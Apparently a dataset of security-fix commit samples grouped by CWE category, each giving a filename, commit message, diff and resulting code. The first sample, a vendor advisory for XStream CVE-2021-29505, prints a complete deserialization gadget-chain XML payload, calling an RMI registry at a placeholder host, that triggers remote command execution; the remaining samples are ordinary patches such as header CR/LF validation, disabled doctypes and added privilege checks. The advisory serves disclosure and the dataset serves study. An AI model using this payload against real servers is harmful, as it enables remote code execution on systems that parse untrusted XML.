+ the LICENSE.txt file.
+ 
+ Created on 8. May 2021 by Joerg Schaible
+ -->
+  <head>
+    <title>CVE-2021-29505</title>
+  </head>
+  <body>
+
+    <h2 id="vulnerability">Vulnerability</h2>
+    
+    <p>CVE-2021-29505: XStream is vulnerable to a Remote Command Execution attack.</p>
+	
+    <h2 id="affected_versions">Affected Versions</h2>
+    
+	<p>All versions until and including version 1.4.16 are affected, if using the version out of the box. No user is
+	affected, who followed the recommendation to setup <a href="security.html#framework">XStream's security
+	framework</a> with a whitelist limited to the minimal required types.</p>
+
+    <h2 id="description">Description</h2>
+    
+    <p>The processed stream at unmarshalling time contains type information to recreate the formerly written objects.
+    XStream creates therefore new instances based on these type information.  An attacker can manipulate the processed
+    input stream and replace or inject objects, that result in execution of a local command on the server.</p>
+
+    <h2 id="reproduction">Steps to Reproduce</h2>
+
+	<p>Create a simple PriorityQueue and use XStream to marshal it to XML.  Replace the XML with following snippet and
+	unmarshal it again with XStream:</p>
+<div class="Source XML"><pre>&lt;java.util.PriorityQueue serialization='custom'&gt;
+  &lt;unserializable-parents/&gt;
+  &lt;java.util.PriorityQueue&gt;
+    &lt;default&gt;
+      &lt;size&gt;2&lt;/size&gt;
+    &lt;/default&gt;
+    &lt;int&gt;3&lt;/int&gt;
+    &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;
+      &lt;type&gt;12345&lt;/type&gt;
+      &lt;value class='com.sun.org.apache.xpath.internal.objects.XString'&gt;
+        &lt;m__obj class='string'&gt;com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content: &lt;none&gt;&lt;/m__obj&gt;
+      &lt;/value&gt;
+    &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;
+    &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;
+      &lt;type&gt;12345&lt;/type&gt;
+      &lt;value class='com.sun.xml.internal.ws.api.message.Packet' serialization='custom'&gt;
+        &lt;message class='com.sun.xml.internal.ws.message.saaj.SAAJMessage'&gt;
+          &lt;parsedMessage&gt;true&lt;/parsedMessage&gt;
+          &lt;soapVersion&gt;SOAP_11&lt;/soapVersion&gt;
+          &lt;bodyParts/&gt;
+          &lt;sm class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'&gt;
+            &lt;attachmentsInitialized&gt;false&lt;/attachmentsInitialized&gt;
+            &lt;multiPart class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'&gt;
+              &lt;soapPart/&gt;
+              &lt;mm&gt;
+                &lt;it class='com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator'&gt;
+                  &lt;aliases class='com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl'&gt;
+                    &lt;candidates class='com.sun.jndi.rmi.registry.BindingEnumeration'&gt;
+                      &lt;names&gt;
+                        &lt;string&gt;aa&lt;/string&gt;
+                        &lt;string&gt;aa&lt;/string&gt;
+                      &lt;/names&gt;
+                      &lt;ctx&gt;
+                        &lt;environment/&gt;
+                        &lt;registry class='sun.rmi.registry.RegistryImpl_Stub' serialization='custom'&gt;
+                          &lt;java.rmi.server.RemoteObject&gt;
+                            &lt;string&gt;UnicastRef&lt;/string&gt;
+                            &lt;string&gt;ip2&lt;/string&gt;
+                            &lt;int&gt;1099&lt;/int&gt;
+                            &lt;long&gt;0&lt;/long&gt;
+                            &lt;int&gt;0&lt;/int&gt;
+                            &lt;short&gt;0&lt;/short&gt;
+                            &lt;boolean&gt;false&lt;/boolean&gt;
+                          &lt;/java.rmi.server.RemoteObject&gt;
+                        &lt;/registry&gt;
+                        &lt;host&gt;ip2&lt;/host&gt;
+                        &lt;port&gt;1099&lt;/port&gt;
+                      &lt;/ctx&gt;
+                    &lt;/candidates&gt;
+                  &lt;/aliases&gt;
+                &lt;/it&gt;
+              &lt;/mm&gt;
+            &lt;/multiPart&gt;
+          &lt;/sm&gt;
+        &lt;/message&gt;
+      &lt;/value&gt;
+    &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;
+  &lt;/java.util.PriorityQueue&gt;
+&lt;/java.util.PriorityQueue&gt;
+</pre></div>
+<div class="Source Java"><pre>XStream xstream = new XStream();
+xstream.fromXML(xml);
+</pre></div>
+
+    <p>As soon as the XML gets unmarshalled, the payload gets executed and the command is executed on the host.</p>
+
+    <p>Note, this example uses XML, but the attack can be performed for any supported format. e.g. JSON.</p>
+
+    <h2 id="impact">Impact</h2>
+
+	<p>The vulnerability may allow a remote attacker has sufficient rights to execute commands of the host only by
+	manipulating the processed input stream.</p>
+
+    <h2 id="workarounds">Workarounds</h2>
+
+    <p>See <a href="security.html#workaround">workarounds</a> for the different versions covering all CVEs.</p>
+
+    <h2 id="credits">Credits</h2>
+    
+    <p>V3geB1rd, white hat hacker from Tencent Security Response Center found and reported the issue to XStream and provided the required information to reproduce it.</p>
+    
+  	</body>
+ </html>

Code after:
<html>
<!--
 Copyright (C) 2021 XStream committers.
 All rights reserved.
 
 The software in this package is published under the terms of the BSD
 style license a copy of which has been included with this distribution in
 the LICENSE.txt file.
 
 Created on 8. May 2021 by Joerg Schaible
 -->
  <head>
    <title>CVE-2021-29505</title>
  </head>
  <body>

    <h2 id="vulnerability">Vulnerability</h2>
    
    <p>CVE-2021-29505: XStream is vulnerable to a Remote Command Execution attack.</p>
	
    <h2 id="affected_versions">Affected Versions</h2>
    
	<p>All versions until and including version 1.4.16 are affected, if using the version out of the box. No user is
	affected, who followed the recommendation to setup <a href="security.html#framework">XStream's security
	framework</a> with a whitelist limited to the minimal required types.</p>

    <h2 id="description">Description</h2>
    
    <p>The processed stream at unmarshalling time contains type information to recreate the formerly written objects.
    XStream creates therefore new instances based on these type information.  An attacker can manipulate the processed
    input stream and replace or inject objects, that result in execution of a local command on the server.</p>

    <h2 id="reproduction">Steps to Reproduce</h2>

	<p>Create a simple PriorityQueue and use XStream to marshal it to XML.  Replace the XML with following snippet and
	unmarshal it again with XStream:</p>
<div class="Source XML"><pre>&lt;java.util.PriorityQueue serialization='custom'&gt;
  &lt;unserializable-parents/&gt;
  &lt;java.util.PriorityQueue&gt;
    &lt;default&gt;
      &lt;size&gt;2&lt;/size&gt;
    &lt;/default&gt;
    &lt;int&gt;3&lt;/int&gt;
    &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;
      &lt;type&gt;12345&lt;/type&gt;
      &lt;value class='com.sun.org.apache.xpath.internal.objects.XString'&gt;
        &lt;m__obj class='string'&gt;com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content: &lt;none&gt;&lt;/m__obj&gt;
      &lt;/value&gt;
    &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;
    &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;
      &lt;type&gt;12345&lt;/type&gt;
      &lt;value class='com.sun.xml.internal.ws.api.message.Packet' serialization='custom'&gt;
        &lt;message class='com.sun.xml.internal.ws.message.saaj.SAAJMessage'&gt;
          &lt;parsedMessage&gt;true&lt;/parsedMessage&gt;
          &lt;soapVersion&gt;SOAP_11&lt;/soapVersion&gt;
          &lt;bodyParts/&gt;
          &lt;sm class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'&gt;
            &lt;attachmentsInitialized&gt;false&lt;/attachmentsInitialized&gt;
            &lt;multiPart class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'&gt;
              &lt;soapPart/&gt;
              &lt;mm&gt;
                &lt;it class='com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator'&gt;
                  &lt;aliases class='com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl'&gt;
                    &lt;candidates class='com.sun.jndi.rmi.registry.BindingEnumeration'&gt;
                      &lt;names&gt;
                        &lt;string&gt;aa&lt;/string&gt;
                        &lt;string&gt;aa&lt;/string&gt;
                      &lt;/names&gt;
                      &lt;ctx&gt;
                        &lt;environment/&gt;
                        &lt;registry class='sun.rmi.registry.RegistryImpl_Stub' serialization='custom'&gt;
                          &lt;java.rmi.server.RemoteObject&gt;
                            &lt;string&gt;UnicastRef&lt;/string&gt;
                            &lt;string&gt;ip2&lt;/string&gt;
                            &lt;int&gt;1099&lt;/int&gt;
                            &lt;long&gt;0&lt;/long&gt;
                            &lt;int&gt;0&lt;/int&gt;
                            &lt;short&gt;0&lt;/short&gt;
                            &lt;boolean&gt;false&lt;/boolean&gt;
                          &lt;/java.rmi.server.RemoteObject&gt;
                        &lt;/registry&gt;
                        &lt;host&gt;ip2&lt;/host&gt;
                        &lt;port&gt;1099&lt;/port&gt;
                      &lt;/ctx&gt;
                    &lt;/candidates&gt;
                  &lt;/aliases&gt;
                &lt;/it&gt;
              &lt;/mm&gt;
            &lt;/multiPart&gt;
          &lt;/sm&gt;
        &lt;/message&gt;
      &lt;/value&gt;
    &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;
  &lt;/java.util.PriorityQueue&gt;
&lt;/java.util.PriorityQueue&gt;
</pre></div>
<div class="Source Java"><pre>XStream xstream = new XStream();
xstream.fromXML(xml);
</pre></div>

    <p>As soon as the XML gets unmarshalled, the payload gets executed and the command is executed on the host.</p>

    <p>Note, this example uses XML, but the attack can be performed for any supported format. e.g. JSON.</p>

    <h2 id="impact">Impact</h2>

	<p>The vulnerability may allow a remote attacker has sufficient rights to execute commands of the host only by
	manipulating the processed input stream.</p>

    <h2 id="workarounds">Workarounds</h2>

    <p>See <a href="security.html#workaround">workarounds</a> for the different versions covering all CVEs.</p>

    <h2 id="credits">Credits</h2>
    
    <p>V3geB1rd, white hat hacker from Tencent Security Response Center found and reported the issue to XStream and provided the required information to reproduce it.</p>
    
  	</body>
 </html>


--------------------

********************
CWE-200: Exposure of Sensitive Information to an Unauthorized Actor (22 samples)
********************
Filename: InterfaceGenerator.java
Message: https://issues.jboss.org/browse/WFK2-375 enhanced fix

git-svn-id: https://svn.jboss.org/repos/seam/branches/enterprise/WFK-2_1@15651 a9c07ecc-ef43-0410-a306-c911db474e88

Diff: @@ -88,16 +88,8 @@ public class InterfaceGenerator extends BaseRequestHandler implements RequestHan
               Component component = Component.forName(componentName);
               if (component == null)
               {                 
-                 try
-                 {
-                    Class c = Reflections.classForName(componentName);
-                    appendClassSource(response.getOutputStream(), c, types);
-                 }
-                 catch (ClassNotFoundException ex)
-                 {
-                    log.error(String.format("Component not found: [%s]", componentName));
-                    throw new ServletException("Invalid request - component not found.");
-                 }
+                 log.error(String.format("Component not found: [%s]", componentName));
+                 throw new ServletException("Invalid request - component not found.");
               }
               else
               {

Code after:
           Set<Type> types = new HashSet<Type>();
           
           response.setContentType("text/javascript");

           Enumeration e = request.getParameterNames();
           while (e.hasMoreElements())
           {
              String componentName = ((String) e.nextElement()).trim();
              
              Component component = Component.forName(componentName);
              if (component == null)
              {                 
                 log.error(String.format("Component not found: [%s]", componentName));
                 throw new ServletException("Invalid request - component not found.");
              }
              else
              {
                 components.add(component);
              }
           }
           
           generateComponentInterface(components, response.getOutputStream(), types);            
       }
     }.run();
  }

  /**
   * Generates the JavaScript code required to invoke the methods of a component/s.
   *
   * @param components Component[] The components to generate javascript for
   * @param out OutputStream The OutputStream to write the generated javascript to
   * @throws IOException Thrown if there is an error writing to the OutputStream
   */
  public void generateComponentInterface(Set<Component> components, OutputStream out, Set<Type> types)
      throws IOException
  {


--------------------
Filename: XML.java
Message: https://issues.jboss.org/browse/WFK2-375 enhanced fix

git-svn-id: https://svn.jboss.org/repos/seam/branches/enterprise/WFK-2_1@15651 a9c07ecc-ef43-0410-a306-c911db474e88

Diff: @@ -65,4 +65,17 @@ public class XML
        }
 
    }
+   
+   /**
+    * Get safe SaxReader with doctype feature disabled 
+    * @see http://xerces.apache.org/xerces2-j/features.html#disallow-doctype-decl 
+    * @return
+    * @throws Exception
+    */
+   public static SAXReader getSafeSaxReader() throws Exception
+   {
+      SAXReader xmlReader = new SAXReader();
+      xmlReader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+      return xmlReader;
+   }
 }

Code after:
       implements EntityResolver 
   {
       private static final byte[] empty = new byte[0];

       public InputSource resolveEntity(String systemId, String publicId) 
           throws SAXException, 
                  IOException 
       {
           return new InputSource(new ByteArrayInputStream(empty));
       }

   }
   
   /**
    * Get safe SaxReader with doctype feature disabled 
    * @see http://xerces.apache.org/xerces2-j/features.html#disallow-doctype-decl 
    * @return
    * @throws Exception
    */
   public static SAXReader getSafeSaxReader() throws Exception
   {
      SAXReader xmlReader = new SAXReader();
      xmlReader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
      return xmlReader;
   }
}


--------------------
Filename: ConversationsActivity.java
Message: Do not insert text shared over XMPP uri when already drafting message

XMPP uris in the style of `xmpp:test@domain.tld?body=Something` can be used to
directly share a message with a specific contact. Previously the text was
always appended to the message currently in draft. The message was never send
automatically. Essentially those links where treated like normal text share
intents (for example when sharing a URL from the browser) but without the
contact selection.

There is a concern (CVE-2018-18467) that when this URI is invoked automatically
and the user is currently drafting a long message to that particular contact
the text could be inserted in the draft field (input box) without the user
noticing.

To circumvent that the text shared over XMPP uris that contain a particular
contact is now appended only if the draft box is currently empty.

Sharing text normally (**with** manual contact selection) is still treated the
same; meaning the shared text will be appended to the current draft. This is
intended behaviour to make the
'Hey I have this cool link here;' *open browser*, *share link* - secenario
work.

Diff: @@ -92,6 +92,7 @@ public class ConversationsActivity extends XmppActivity implements OnConversatio
     public static final String EXTRA_AS_QUOTE = "as_quote";
     public static final String EXTRA_NICK = "nick";
     public static final String EXTRA_IS_PRIVATE_MESSAGE = "pm";
+    public static final String EXTRA_DO_NOT_APPEND = "do_not_append";
 
     private static List<String> VIEW_AND_SHARE_ACTIONS = Arrays.asList(
             ACTION_VIEW_CONVERSATION,

Code after:
import rocks.xmpp.addr.Jid;

import static eu.siacs.conversations.ui.ConversationFragment.REQUEST_DECRYPT_PGP;

public class ConversationsActivity extends XmppActivity implements OnConversationSelected, OnConversationArchived, OnConversationsListItemUpdated, OnConversationRead, XmppConnectionService.OnAccountUpdate, XmppConnectionService.OnConversationUpdate, XmppConnectionService.OnRosterUpdate, OnUpdateBlocklist, XmppConnectionService.OnShowErrorToast, XmppConnectionService.OnAffiliationChanged, XmppConnectionService.OnRoleChanged {

    public static final String ACTION_VIEW_CONVERSATION = "eu.siacs.conversations.action.VIEW";
    public static final String EXTRA_CONVERSATION = "conversationUuid";
    public static final String EXTRA_DOWNLOAD_UUID = "eu.siacs.conversations.download_uuid";
    public static final String EXTRA_AS_QUOTE = "as_quote";
    public static final String EXTRA_NICK = "nick";
    public static final String EXTRA_IS_PRIVATE_MESSAGE = "pm";
    public static final String EXTRA_DO_NOT_APPEND = "do_not_append";

    private static List<String> VIEW_AND_SHARE_ACTIONS = Arrays.asList(
            ACTION_VIEW_CONVERSATION,
            Intent.ACTION_SEND,
            Intent.ACTION_SEND_MULTIPLE
    );

    public static final int REQUEST_OPEN_MESSAGE = 0x9876;
    public static final int REQUEST_PLAY_PAUSE = 0x5432;


    //secondary fragment (when holding the conversation, must be initialized before refreshing the overview fragment
    private static final @IdRes
    int[] FRAGMENT_ID_NOTIFICATION_ORDER = {R.id.secondary_fragment, R.id.main_fragment};


--------------------
Filename: ResponseRetention.java
Message: [MAPR] Setted responses retention time on fake requests

Diff: @@ -0,0 +1,27 @@
+/*
+ * Copyright (c) 2020 Gobierno de España
+ *
+ * This Source Code Form is subject to the terms of the Mozilla Public
+ * License, v. 2.0. If a copy of the MPL was not distributed with this
+ * file, You can obtain one at http://mozilla.org/MPL/2.0/.
+ *
+ * SPDX-License-Identifier: MPL-2.0
+ */
+package org.dpppt.backend.sdk.ws.radarcovid.annotation;
+
+import java.lang.annotation.Documented;
+import java.lang.annotation.ElementType;
+import java.lang.annotation.Retention;
+import java.lang.annotation.RetentionPolicy;
+import java.lang.annotation.Target;
+
+@Documented
+@Retention(value=RetentionPolicy.RUNTIME)
+@Target(value={ElementType.CONSTRUCTOR, ElementType.METHOD})
+public @interface ResponseRetention {
+
+	/**
+	 * Environment property with response retention time, in milliseconds
+	 */
+	String time();
+}

Code after:
/*
 * Copyright (c) 2020 Gobierno de España
 *
 * This Source Code Form is subject to the terms of the Mozilla Public
 * License, v. 2.0. If a copy of the MPL was not distributed with this
 * file, You can obtain one at http://mozilla.org/MPL/2.0/.
 *
 * SPDX-License-Identifier: MPL-2.0
 */
package org.dpppt.backend.sdk.ws.radarcovid.annotation;

import java.lang.annotation.Documented;
import java.lang.annotation.ElementType;
import java.lang.annotation.Retention;
import java.lang.annotation.RetentionPolicy;
import java.lang.annotation.Target;

@Documented
@Retention(value=RetentionPolicy.RUNTIME)
@Target(value={ElementType.CONSTRUCTOR, ElementType.METHOD})
public @interface ResponseRetention {

	/**
	 * Environment property with response retention time, in milliseconds
	 */
	String time();
}


--------------------
Filename: GaenController.java
Message: [MAPR] AOP aspects ordering

Diff: @@ -191,6 +191,7 @@ public GaenController(GAENDataService dataService, FakeKeyService fakeKeyService
 
 	@PostMapping(value = "/exposednextday")
 	@Loggable
+	@ResponseRetention(time = "application.response.retention.time.exposednextday")
 	@Transactional
 	@Operation(description = "Allows the client to send the last exposed key of the infection to the backend server. The JWT must come from a previous call to /exposed")
 	@ApiResponses(value = {

Code after:
			responseBuilder.header("Authorization", "Bearer " + jwt);
			responseBuilder.header("X-Exposed-Token", "Bearer " + jwt);
		}
		Callable<ResponseEntity<String>> cb = () -> {
			normalizeRequestTime(now);
			return responseBuilder.body("OK");
		};
		return cb;
	}

	@PostMapping(value = "/exposednextday")
	@Loggable
	@ResponseRetention(time = "application.response.retention.time.exposednextday")
	@Transactional
	@Operation(description = "Allows the client to send the last exposed key of the infection to the backend server. The JWT must come from a previous call to /exposed")
	@ApiResponses(value = {
			@ApiResponse(responseCode = "200", description = "The exposed key has been stored in the backend"),
			@ApiResponse(responseCode = "400", description = 
					"- Ivnalid base64 encoded Temporary Exposure Key" +
					"- TEK-date does not match delayedKeyDAte claim in Jwt" +
					"- TEK has negative rolling period"),
			@ApiResponse(responseCode = "403", description = "No delayedKeyDate claim in authentication") })
	public @ResponseBody Callable<ResponseEntity<String>> addExposedSecond(
			@Valid @RequestBody @Parameter(description = "The last exposed key of the user") GaenSecondDay gaenSecondDay,
			@RequestHeader(value = "User-Agent") @Parameter(description = "App Identifier (PackageName/BundleIdentifier) + App-Version + OS (Android/iOS) + OS-Version", example = "ch.ubique.android.starsdk;1.0;iOS;13.3") String userAgent,
			@AuthenticationPrincipal @Parameter(description = "JWT token that can be verified by the backend server, must have been created by /v1/gaen/exposed and contain the delayedKeyDate") Object principal) {
		var now = Instant.now().toEpochMilli();


--------------------
Filename: PrimaryStatusProviderController.java
Message: #000 - Disable business-continuity

Diff: @@ -44,7 +44,6 @@ import static org.apache.commons.lang3.StringUtils.isEmpty;
 
 @Controller
 @SuppressWarnings("WeakerAccess")
-@RequestMapping(value = "/add-on/business-continuity/api")
 public class PrimaryStatusProviderController {
 
     private GoFilesStatusProvider goFilesStatusProvider;

Code after:
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.util.HashMap;
import java.util.Map;

import static org.apache.commons.io.IOUtils.copy;
import static org.apache.commons.lang3.StringUtils.isBlank;
import static org.apache.commons.lang3.StringUtils.isEmpty;

@Controller
@SuppressWarnings("WeakerAccess")
public class PrimaryStatusProviderController {

    private GoFilesStatusProvider goFilesStatusProvider;
    private DatabaseStatusProvider databaseStatusProvider;
    private final SystemEnvironment systemEnvironment;
    private PluginsList pluginsList;

    @Autowired
    public PrimaryStatusProviderController(GoFilesStatusProvider goFilesStatusProvider, DatabaseStatusProvider databaseStatusProvider, PluginsList pluginsList, SystemEnvironment systemEnvironment) {
        this.goFilesStatusProvider = goFilesStatusProvider;
        this.databaseStatusProvider = databaseStatusProvider;
        this.pluginsList = pluginsList;
        this.systemEnvironment = systemEnvironment;
    }



--------------------
Filename: CmsVersion.java
Message: 安全漏洞修复 感谢 姜洋-长亭科技

Diff: @@ -28,7 +28,7 @@ public class CmsVersion {
      * @return revision
      */
     public static final String getRevision() {
-        return "a";
+        return "b";
     }
 
     /**

Code after:
    private static Copyright copyright = new CmsCopyright();

    /**
     * @return version
     */
    public static final String getVersion() {
        return "V4.0.202204";
    }
    /**
     * @return revision
     */
    public static final String getRevision() {
        return "b";
    }

    /**
     * @return whether the authorization edition
     */
    public static boolean isAuthorizationEdition() {
        return copyright.verify(CommonConstants.CMS_FILEPATH + CommonConstants.LICENSE_FILENAME);
    }

    /**
     * @param domain
     * @return whether the domain authorized
     */
    public static boolean verifyDomain(String domain) {


--------------------
Filename: Root.java
Message: Fix UnsafeAccess perm checking

Diff: @@ -157,8 +157,8 @@ public class Root {
     @Contract(pure = false)
     public static <T> T throw0(Throwable throwable) {
         if (throwable == null) throw new NullPointerException();
-        getUnsafe().throwException(throwable);
-        throw new RuntimeException();
+        Unsafe.getUnsafe0().throwException(throwable);
+        throw new RuntimeException(throwable);
     }
 
     /**

Code after:
    static class Secret {
        static ModuleAccess MACCESS;
    }

    /**
     * Throw a new exception
     *
     * @since 1.2.0
     */
    @Contract(pure = false)
    public static <T> T throw0(Throwable throwable) {
        if (throwable == null) throw new NullPointerException();
        Unsafe.getUnsafe0().throwException(throwable);
        throw new RuntimeException(throwable);
    }

    /**
     * Allocate a new object, but not initialized.
     *
     * @see Unsafe#allocateInstance(Class)
     * @since 1.2.0
     */
    @SuppressWarnings("unchecked")
    @Contract(pure = false)
    public static <T> T allocate(Class<T> klass) throws InstantiationException {
        return (T) getUnsafe().allocateInstance(klass);
    }



--------------------
Filename: UnsafeAccess.java
Message: Fix UnsafeAccess perm checking

Diff: @@ -17,7 +17,8 @@ public final class UnsafeAccess extends ProtectedObject {
     static final UnsafeAccess INSTANCE = new UnsafeAccess();
 
     public static UnsafeAccess getInstance() {
-        SecurityCheck.getInstance();
+        SecurityCheck.AccessLimiter accessLimiter = SecurityCheck.getInstance().getLimiter();
+        if (accessLimiter != null) accessLimiter.preGetUnsafeAccess();
         return INSTANCE;
     }
 

Code after:
 * <p>
 * A bridge object to access unsafe.
 * <p>
 * Unlike other methods, using this bridge will not trigger any permission checks.
 * The permission check will only happen in {@link #getInstance()}
 *
 * @since 1.4.0
 */
public final class UnsafeAccess extends ProtectedObject {
    static final UnsafeAccess INSTANCE = new UnsafeAccess();

    public static UnsafeAccess getInstance() {
        SecurityCheck.AccessLimiter accessLimiter = SecurityCheck.getInstance().getLimiter();
        if (accessLimiter != null) accessLimiter.preGetUnsafeAccess();
        return INSTANCE;
    }

    public SecurityCheck getSecuritySettings() {
        checkTrusted();
        return SecurityCheck.INSTANCE;
    }

    public Unsafe getUnsafe() {
        checkTrusted();
        return Unsafe.getUnsafe0();
    }

    /**


--------------------

********************
CWE-20: Improper Input Validation (21 samples)
********************
Filename: HtmlFormFromFileController.java
Message: Added privilege check when previewing an uploaded html form

Diff: @@ -44,6 +44,8 @@ public class HtmlFormFromFileController {
 	                          @RequestParam(value = "patientId", required = false) Integer pId,
 	                          @RequestParam(value = "isFileUpload", required = false) boolean isFileUpload,
 	                          HttpServletRequest request) throws Exception {
+
+        Context.requirePrivilege("Manage Forms");
 		
 		if (log.isDebugEnabled())
 			log.debug("In reference data...");

Code after:
public class HtmlFormFromFileController {
	
	private static final String TEMP_HTML_FORM_FILE_PREFIX = "html_form_";
	
	/** Logger for this class and subclasses */
	protected final Log log = LogFactory.getLog(getClass());
	
	@RequestMapping("/module/htmlformentry/htmlFormFromFile.form")
	public void handleRequest(Model model, @RequestParam(value = "filePath", required = false) String filePath,
	                          @RequestParam(value = "patientId", required = false) Integer pId,
	                          @RequestParam(value = "isFileUpload", required = false) boolean isFileUpload,
	                          HttpServletRequest request) throws Exception {

        Context.requirePrivilege("Manage Forms");
		
		if (log.isDebugEnabled())
			log.debug("In reference data...");
		
		model.addAttribute("previewHtml", "");
		String message = "";
		File f = null;
		try {
			if (isFileUpload) {
				MultipartHttpServletRequest multipartRequest = (MultipartHttpServletRequest) request;
				MultipartFile multipartFile = multipartRequest.getFile("htmlFormFile");
				if (multipartFile != null) {
					//use the same file for the logged in user
					f = new File(SystemUtils.JAVA_IO_TMPDIR, TEMP_HTML_FORM_FILE_PREFIX


--------------------
Filename: OperationSetBasicInstantMessagingJabberImpl.java
Message: Checks from for received carbon messages, should be bare jid.

Diff: @@ -815,6 +815,17 @@ public void processPacket(Packet packet)
                         ForwardedPacketExtension.class);
                 if(extensions.isEmpty())
                     return;
+
+                // according to xep-0280 all carbons should come from
+                // our bare jid
+                if (!msg.getFrom().equals(
+                        StringUtils.parseBareAddress(
+                            jabberProvider.getOurJID())))
+                {
+                    logger.info("Received a carbon copy with wrong from!");
+                    return;
+                }
+
                 ForwardedPacketExtension forwardedExt = extensions.get(0);
                 msg = forwardedExt.getMessage();
                 if(msg == null || msg.getBody() == null)

Code after:
                        CarbonPacketExtension.NAMESPACE);
                if(carbonExt == null)
                    return;

                isForwardedSentMessage
                    = (carbonExt.getElementName()
                        == CarbonPacketExtension.SENT_ELEMENT_NAME);
                List<ForwardedPacketExtension> extensions
                    = carbonExt.getChildExtensionsOfType(
                        ForwardedPacketExtension.class);
                if(extensions.isEmpty())
                    return;

                // according to xep-0280 all carbons should come from
                // our bare jid
                if (!msg.getFrom().equals(
                        StringUtils.parseBareAddress(
                            jabberProvider.getOurJID())))
                {
                    logger.info("Received a carbon copy with wrong from!");
                    return;
                }

                ForwardedPacketExtension forwardedExt = extensions.get(0);
                msg = forwardedExt.getMessage();
                if(msg == null || msg.getBody() == null)
                    return;

            }

            Object multiChatExtension =
                msg.getExtension("x", "http://jabber.org/protocol/muc#user");

            // its not for us
            if(multiChatExtension != null)
                return;



--------------------
Filename: HttpUtils.java
Message: Http header CR / LF validation - fixes #2470

Diff: @@ -521,4 +521,23 @@ public final class HttpUtils {
     }
     return -1;
   }
+
+  public static void validateHeader(CharSequence name, CharSequence value) {
+    validateHeader(name);
+    validateHeader(value);
+  }
+
+  public static void validateHeader(CharSequence name, Iterable<? extends CharSequence> values) {
+    validateHeader(name);
+    values.forEach(HttpUtils::validateHeader);
+  }
+
+  public static void validateHeader(CharSequence value) {
+    for (int i = 0;i < value.length();i++) {
+      char c = value.charAt(i);
+      if (c == '\r' || c == '\n') {
+        throw new IllegalArgumentException("Illegal header character: " + ((int)c));
+      }
+    }
+  }
 }

Code after:
              break;
            }
          }
          if (ret > -1) {
            return ret;
          }
        }
      }
      pos = next;
    }
    return -1;
  }

  public static void validateHeader(CharSequence name, CharSequence value) {
    validateHeader(name);
    validateHeader(value);
  }

  public static void validateHeader(CharSequence name, Iterable<? extends CharSequence> values) {
    validateHeader(name);
    values.forEach(HttpUtils::validateHeader);
  }

  public static void validateHeader(CharSequence value) {
    for (int i = 0;i < value.length();i++) {
      char c = value.charAt(i);
      if (c == '\r' || c == '\n') {
        throw new IllegalArgumentException("Illegal header character: " + ((int)c));
      }
    }
  }
}


--------------------
Filename: FactoryRegistryTest.java
Message: [GEOT-7115] Streamline JNDI lookups

Diff: @@ -68,6 +68,7 @@ public void ensureHintsLoaded() {
      * @param creator {@code true} if the registry should be an instance of {@link
      *     org.geotools.util.factory.FactoryCreator}.
      */
+    @SuppressWarnings("PMD.UnusedPrivateMethod") // PMD getting confused here?
     private FactoryRegistry getRegistry(
             final boolean creator,
             final Factory factory1,

Code after:
     * Creates the factory registry to test. The tests performed in this method are more J2SE tests
     * than Geotools implementation tests. We basically just ensure that we have setup the service
     * registry properly.
     *
     * <p>Factories are specified in arguments as {@link org.geotools.util.factory.Factory} objects
     * in order to avoid the {@link DummyClass} to be initialized before {@link
     * org.geotools.util.factory.Hints}. This is not a problem for normal execution, but Maven seems
     * to mess with class loaders.
     *
     * @param creator {@code true} if the registry should be an instance of {@link
     *     org.geotools.util.factory.FactoryCreator}.
     */
    @SuppressWarnings("PMD.UnusedPrivateMethod") // PMD getting confused here?
    private FactoryRegistry getRegistry(
            final boolean creator,
            final Factory factory1,
            final Factory factory2,
            final Factory factory3) {
        @SuppressWarnings("unchecked")
        final Set<Class<?>> categories = Collections.singleton(DummyFactory.class);
        // The above line fails without the cast, I don't know why...
        final FactoryRegistry registry;
        if (creator) {
            registry = new FactoryCreator(categories);
        } else {
            registry = new FactoryRegistry(categories);
        }


--------------------
Filename: AbstractEpsgFactory.java
Message: [GEOT-7115] Streamline JNDI lookups

Diff: @@ -303,7 +303,7 @@ public AbstractEpsgFactory(final Hints userHints) throws FactoryException {
             if (hint instanceof String) {
                 String name = (String) hint;
                 try {
-                    dataSource = (DataSource) GeoTools.getInitialContext().lookup(name);
+                    dataSource = (DataSource) GeoTools.jndiLookup(name);
                 } catch (NamingException e) {
                     throw new FactoryException("A EPSG_DATA_SOURCE hint is required:" + e);
                 }

Code after:
        // but tell to the user what this factory do about axis order.
        hints.put(Hints.FORCE_LONGITUDE_FIRST_AXIS_ORDER, Boolean.FALSE);
        hints.put(Hints.FORCE_STANDARD_AXIS_DIRECTIONS, Boolean.FALSE);
        hints.put(Hints.FORCE_STANDARD_AXIS_UNITS, Boolean.FALSE);

        //
        // We need to obtain our DataSource
        if (userHints != null) {
            Object hint = userHints.get(Hints.EPSG_DATA_SOURCE);
            if (hint instanceof String) {
                String name = (String) hint;
                try {
                    dataSource = (DataSource) GeoTools.jndiLookup(name);
                } catch (NamingException e) {
                    throw new FactoryException("A EPSG_DATA_SOURCE hint is required:" + e);
                }
                hints.put(Hints.EPSG_DATA_SOURCE, dataSource);
            } else if (hint instanceof DataSource) {
                dataSource = (DataSource) hint;
                hints.put(Hints.EPSG_DATA_SOURCE, dataSource);
            } else {
                throw new FactoryException("A EPSG_DATA_SOURCE hint is required.");
            }
        } else {
